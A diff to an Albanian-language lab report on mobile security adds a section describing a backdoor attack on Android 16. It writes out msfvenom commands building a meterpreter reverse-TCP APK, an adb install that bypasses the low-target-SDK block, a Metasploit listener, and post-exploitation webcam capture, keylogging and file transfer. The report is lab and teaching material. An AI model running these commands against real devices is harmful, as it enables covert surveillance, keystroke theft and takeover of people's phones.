@@ -182,7 +182,51 @@ Dokumentimi i kësaj faze u fokusua te emri i folder-it, vendndodhja e tij në s
 
 Në skenarin e simuluar u analizua ndikimi i një moduli që mund të ruajë photos ose videos në një output directory, me qëllim identifikimin e artefakteve dhe të rrezikut për privatësinë.
 
-## Pika 3 - Krahasimi i sistemeve
+## Pika 3 - Backdoor attack
+
+### Gjenerimi i Payload-it dhe Mekanizmat e Transmetimit
+
+Për të penetruar mbrojtjen e avancuar të `Android 16`, ne përdorëm mjetin `msfvenom` për të krijuar një Stageless Payload. Zgjodhëm këtë metodë pasi payload-et tradicionale (staged) shpesh identifikohen dhe mbyllen nga sistemi operativ gjatë shkëmbimit të të dhënave. Komanda e ekzekutuar për gjenerimin e skedarit APK ishte:
+
+```bash
+msfvenom -p android/meterpreter_reverse_tcp LHOST=192.168.1.7 LPORT=4444 ARCH=aarch64 PLATFORM=android -o backdoor.apk
+```
+
+Ne specifikuam arkitekturën `aarch64` për të garantuar përputhshmërinë me procesorët modernë `64-bit`. Për transmetimin e këtij payload-i, simuluam një server web lokal duke përdorur Python:
+
+```bash
+python -m http.server 8080
+```
+
+Në anën e targetit, për të anashkaluar kufizimet e instalimit të `SDK-ve` të vjetra në `Android 16`, ne përdorëm `ADB` me parametrin specifik të bypass-it:
+
+```bash
+adb install --bypass-low-target-sdk-block backdoor.apk
+```
+
+### Konfigurimi i Listener dhe Kapja e Session-it
+
+Për të pritur lidhjen hyrëse (Inbound Connection) nga smartphone, ne konfiguruam një Multi-Handler brenda Armitage. Kjo u realizua duke përdorur komandat:
+
+```bash
+use exploit/multi/handler
+
+set payload android/meterpreter_reverse_tcp
+
+set LHOST 192.168.1.7
+
+exploit -j
+```
+
+Ky listener qëndroi aktiv në background derisa njësia smartphone ekzekutoi aplikacionin, duke krijuar një `Reverse TCP Connection` që u shfaq si një session aktiv i Meterpreter në interface-in grafik të Armitage.
+
+### Operacionet Ofensive (Post-Exploitation)
+
+Pasi siguruam kontrollin mbi pajisjen, ne performuam disa veprime ofensive sipas preferencave të kërkuara në laborator. Për menaxhimin e skedarëve dhe krijimin e direktorive, ne ekzekutuam komandën `mkdir /sdcard/folder_test`. Për monitorimin e kamerës, përdorëm `webcam_snap -i 1` për të marrë një imazh në kohë reale.
+
+Për funksionin e `Keylogger`, fillimisht aktivizuam shërbimin me `keyscan_start` dhe më pas nxorëm të dhënat e kapura me `keyscan_dump`. Gjithashtu, realizuam shkëmbim skedarësh duke përdorur komandat upload dhe download direkt nga konsola e Meterpreter, duke provuar aksesin e plotë mbi sistemin e skedarëve të targetit.
+
+## Krahasimi i sistemeve
 
 Ky raport dokumenton një skenar laboratorik të autorizuar, ku u analizua dallimi midis një sistemi vulnerable dhe një sistemi secure, me fokus te identifikimi i rrezikut, ndikimi operacional dhe masat e nevojshme për uljen e attack surface.
 
